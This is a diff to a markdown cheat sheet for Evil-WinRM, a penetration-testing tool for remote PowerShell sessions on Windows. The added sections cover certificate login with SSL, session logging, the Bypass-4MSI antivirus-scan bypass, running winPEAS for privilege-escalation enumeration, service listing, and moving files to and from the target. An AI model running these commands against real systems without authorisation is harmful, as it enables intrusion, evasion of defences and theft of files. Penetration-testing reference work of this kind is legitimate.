@@ -32,7 +32,7 @@
 
 ### After generating the private key from the .pfx file, we use Evil-WinRM to authenticate
 
-    evil-winrm -i TARGET_IP -c CERT.pem -k KEY.pem
+    evil-winrm -i TARGET_IP -c CERT.pem -k KEY.pem -S
 
 #### 3) Kerberos
 
@@ -73,3 +73,40 @@
     evil-winrm -i [IPv6] -u USER -p PASSWORD
 
 ### TIP: Enter the IPv6 in your /etc/hosts file and give it a hostname (preferably the target machine name)
+
+#### 6) Store logs with Evil-WinRM
+
+    evil-winrm -i IP -u administrator -p Password@987 -l
+
+Logs will be saved to 
+
+    /home/user/evil-winrm-logs
+    or
+    /root/evil-winrm-logs
+
+#### 7) Run executables in Evil-WinRM sessions
+
+    evil-winrm -i IP -u administrator -p Password@987 -e /opt/privsc
+    Bypass-4MSI
+    menu
+    Invoke-Binary /opt/privsc/winPEASx64.exe
+
+#### 8) Service Enumeration
+
+    menu
+    services
+
+#### 9) File Transfer
+
+Upload a file from our system to target machine
+
+    upload /home/user/test.txt .
+
+Download a file from target machine to our system
+
+    download test.txt /home/user/test.txt
+
+#### 10) Use Evil-WinRM from Docker
+
+    docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i IP -u Administrator -p 'Password@987'
+
